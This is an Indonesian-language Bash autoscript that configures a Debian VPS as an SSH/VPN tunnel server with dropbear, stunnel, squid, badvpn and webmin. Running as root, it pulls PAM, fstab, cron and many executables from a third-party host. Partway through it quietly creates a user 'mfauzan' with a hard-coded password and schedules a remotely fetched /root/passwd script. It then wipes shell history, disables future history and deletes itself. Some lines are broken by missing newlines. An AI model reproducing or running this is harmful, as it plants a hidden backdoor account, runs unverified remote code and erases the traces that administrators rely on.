#!/bin/bash
# Created By M Fauzan Romandhoni (+6283875176829) (m.fauzan58@yahoo.com)

clear

#Requirement
if [ ! -e /usr/bin/curl ]; then
    apt-get -y update && apt-get -y upgrade
        apt-get -y install curl
fi

if  $USER != "root" ; then
        echo "Maaf, Anda harus menjalankan ini sebagai root"
        exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
#MYIP=$(wget -qO- ipv4.icanhazip.com);

# get the VPS IP
#ip=`ifconfig venet0:0 | grep 'inet addr' | awk {'print $2'} | sed s/.*://`

#MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
MYIP=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
if [ "$MYIP" = "" ]; then
        MYIP=$(wget -qO- ipv4.icanhazip.com)
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [ "$ether" = "" ]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

#if  $vps = "zvur" ; then
        #source="http://"
#else
        source="https://cloudip.org/sshinjector.net/debian9"
#fi

# ENABLE IPV4 AND IPV6
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear

# wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# set repo
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
wget "http://www.dotdeb.org/dotdeb.gpg"
wget "http://www.webmin.com/jcameron-key.asc"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get -y --purge remove dropbear*;

# update
apt-get update; apt-get -y upgrade;

# install webserver
apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install build-essential

# script
wget -O /etc/pam.d/common-password "$source/common-password"
chmod +x /etc/pam.d/common-password

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# setting vnstat
vnstat -u -i $ether
vnstat -i $ether
service vnstat restart

# update apt-file
apt-file update

# rc.local
wget -O /etc/rc.local "$source/rc.local";chmod +x /etc/rc.local
wget -O /etc/iptables.up.rules "$source/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# Instal (D)DoS Deflate
if [ -d '/usr/local/ddos' ]; then
        echo; echo; echo "Please un-install the previous version first"
        exit 0
else
        mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf $sources/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE $source/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list $source/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh $source/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'

# install fail2ban
apt-get update;apt-get -y install fail2ban;service fail2ban restart;

# Screenfetch
cd
wget $source/screenfetch
mv screenfetch /usr/bin/screenfetch
chmod +x /usr/bin/screenfetch

# Web Server
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "$source/nginx.conf"
mkdir -p /home/vps/public_html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /home/vps/public_html/index.html $source/index.html
wget -O /etc/nginx/conf.d/vps.conf "$source/vps.conf"
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
service php7.0-fpm restart
service nginx restart

# Cronjob
cd;wget $source/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash mfauzan
echo "mfauzan:121998" | chpasswd
clear
rm -rf /root/cronjob.tar

# badvpn
wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw64
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
# replace BadVPN
apt-get -y install cmake make gcc
wget $source/badvpn-1.999.128.tar.bz2
tar xf badvpn-1.999.128.tar.bz2
mkdir badvpn-build
cd badvpn-build
cmake ~/badvpn-1.999.128 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
make install
screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
cd
rm -f /root/badvpn-1.999.128.tar.bz2

# ssh
sed -i '$ i\Banner /etc/banner.txt' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config

# dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 80 -p 777"/g' /etc/default/dropbearecho "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear
service ssh restart
service dropbear restart
#upgrade
apt-get install zlib1g-dev
wget $source/dropbear-2020.80.tar.bz2
bzip2 -cd dropbear-2020.80.tar.bz2 | tar xvf -
cd dropbear-2020.80
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear1
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
service dropbear restart
rm -f /root/dropbear-2020.80.tar.bz2

# BAANER
wget -O /etc/banner.txt $source/banner.txt
# squid3
apt-get -y install squid3
wget -O /etc/squid/squid.conf $source/squid.conf
sed -i "s/ipserver/$MYIP/g" /etc/squid/squid.conf
service squid restart
# install webmin
cd
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
apt-get -y install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python
service webmin restart

# text gambar
apt-get install boxes

# install teks berwarna
apt-get -y install ruby
gem install lolcat

# Text Berwarna
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc "$source/bash.sh"

# install stunnel4
apt-get -y install stunnel4
wget -O /etc/stunnel/stunnel.pem "$source/stunnel.pem"
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1


[dropbear]
accept = 443
connect = 127.0.0.1:442
connect = 127.0.0.1:456
connect = 127.0.0.1:777

[openssh]
accept = 444
connect = 127.0.0.1:22

END

sed -i $MYIP2 /etc/stunnel/stunnel.conf
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
service stunnel4 restart

# download script
cd
wget -O /usr/bin/benchmark $source/benchmark.sh
wget -O /usr/bin/speedtest $source/speedtest_cli.py
wget -O /usr/bin/ps-mem $source/ps_mem.py
wget -O /usr/bin/dropmon $source/dropmon.sh
wget -O /usr/bin/menu $source/menu.sh
wget -O /usr/bin/user-active-list $source/user-active-list.sh
wget -O /usr/bin/user-add $source/user-add.sh
wget -O /usr/bin/user-del $source/user-del.sh
wget -O /usr/bin/disable-user-expire $source/disable-user-expire.sh
wget -O /usr/bin/delete-user-expire $source/delete-user-expire.sh
wget -O /usr/bin/banned-user $source/banned-user.sh
wget -O /usr/bin/unbanned-user $source/unbanned-user.sh
wget -O /usr/bin/user-expire-list $source/user-expire-list.sh
wget -O /usr/bin/user-gen $source/user-gen.sh
wget -O /usr/bin/userlimit.sh $source/userlimit.sh
wget -O /usr/bin/userlimitssh.sh $source/userlimitssh.sh
wget -O /usr/bin/user-list $source/user-list.sh
wget -O /usr/bin/user-login $source/user-login.sh
wget -O /usr/bin/user-pass $source/user-pass.sh
wget -O /usr/bin/user-renew $source/user-renew.sh
wget -O /usr/bin/edit-openssh $source/edit-openssh.sh
wget -O /usr/bin/edit-dropbear $source/edit-dropbear.sh
wget -O /usr/bin/edit-squid $source/edit-squid.sh
wget -O /usr/bin/edit-stunnel $source/edit-stunnel.sh
wget -O /usr/bin/edit-banner $source/edit-banner.sh
wget -O /usr/bin/health $source/server-health.sh
wget -O /usr/bin/clearcache.sh $source/clearcache.sh
cd

#rm -rf /etc/cron.weekly/
#rm -rf /etc/cron.hourly/
#rm -rf /etc/cron.monthly/
rm -rf /etc/cron.daily/

# autoreboot
echo "*/10 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "*/10 * * * * root service stunnel4 restart" > /etc/cron.d/stunnel4
echo "*/10 * * * * root service squid restart" > /etc/cron.d/squid
echo "*/10 * * * * root service ssh restart" > /etc/cron.d/ssh
echo "*/10 * * * * root service webmin restart" > /etc/cron.d/webmin
#echo "0 */48 * * * root /sbin/reboot" > /etc/cron.d/reboot
echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
echo "00 23 * * * root /usr/bin/delete-user-expire" > /etc/cron.d/delete-user-expire
echo "0 */1 * * * root echo 3 > /proc/sys/vm/drop_caches" > /etc/cron.d/clearcaches
#echo "0 */1 * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1
wget -O /root/passwd "$source/passwd.sh"
chmod +x /root/passwd
echo "01 23 * * * root /root/passwd" > /etc/cron.d/passwd
cd

chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
#chmod +x /usr/bin/autokill
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-del
chmod +x /usr/bin/disable-user-expire
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/banned-user
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/edit-openssh
chmod +x /usr/bin/edit-dropbear
chmod +x /usr/bin/edit-squid
chmod +x /usr/bin/edit-stunnel
chmod +x /usr/bin/edit-banner
chmod +x /usr/bin/health
chmod +x /usr/bin/clearcache.sh

# finishing
chown -R www-data:www-data /home/vps/public_html
service snmpd restart
/etc/init.d/cron restart
/etc/init.d/nginx start
/etc/init.d/php7.0-fpm start
/etc/init.d/vnstat restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/squid restart
/etc/init.d/webmin restart
/etc/init.d/stunnel4 restart
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

# swap ram
dd if=/dev/zero of=/swapfile bs=2048 count=2048k
# buat swap
mkswap /swapfile
# jalan swapfile
swapon /swapfile
#auto star saat reboot
wget $source/fstab
mv ./fstab /etc/fstab
chmod 644 /etc/fstab
sysctl vm.swappiness=10
#permission swapfile
chown root:root /swapfile
chmod 0600 /swapfile
cd

rm -f /root/debian9.sh

history -c

# history
clear
echo ""  | tee -a log-install.txt
echo "================================================"  | tee -a log-install.txt | lolcatecho "   Autoscript Created By M Fauzan Romandhoni "  | tee -a log-install.txt | lolcat
echo "------------------------------------------------"  | tee -a log-install.txt | lolcatecho "Facebook    : https://www.facebook.com/cyb32.n0b"  | tee -a log-install.txt | lolcatecho "Contact Me  : +62 83875176829"  | tee -a log-install.txt | lolcat
echo "------------------------------------------------"  | tee -a log-install.txt | lolcatecho "Service     :" | tee -a log-install.txt | lolcat
echo "-------------" | tee -a log-install.txt | lolcat
echo "Nginx       : 81"  | tee -a log-install.txt | lolcat
echo "Webmin      : http://$MYIP:10000/" | tee -a log-install.txt | lolcat
echo "badvpn      : badvpn-udpgw port 7300" | tee -a log-install.txt | lolcat
echo "Squid3      : 80, 8000, 8080, 3128"  | tee -a log-install.txt | lolcat
echo "OpenSSH     : 22"  | tee -a log-install.txt | lolcat
echo "Dropbear    : 442, 456, 777"  | tee -a log-install.txt | lolcat
echo "SSL/TLS     : 443, 444"  | tee -a log-install.txt | lolcat
echo "Timezone    : Asia/Jakarta"  | tee -a log-install.txt | lolcat
echo "Fail2Ban    : [ON]"   | tee -a log-install.txt | lolcat | lolcat
echo "Anti [D]dos : [ON]"   | tee -a log-install.txt | lolcat
echo "IPv6        : [ON]" | tee -a log-install.txt | lolcat
echo "Tools       :" | tee -a log-install.txt | lolcat
echo "   axel, bmon, htop, iftop, mtr, rkhunter, nethogs: nethogs $ether" | tee -a log-install.txt | lolcat
echo "Auto Lock & Delete User Expire tiap jam 00:00" | tee -a log-install.txt | lolcat
echo "VPS Restart : 00.00/24.00 WIB"   | tee -a log-install.txt | lolcat
echo ""  | tee -a log-install.txt
echo "------------------------------------------------" | tee -a log-install.txt | lolcat
echo "    --------THANK YOU FOR CHOIS US---------" | tee -a log-install.txt | lolcat
echo "================================================" | tee -a log-install.txt | lolcat
echo "-    PLEASE REBOOT TAKE EFFECT TERIMA KASIH    -" | lolcat
echo "ALL MODD DEVELOPED SCRIPT BY M FAUZAN ROMANDHONI" | lolcat
echo "================================================" | lolcat
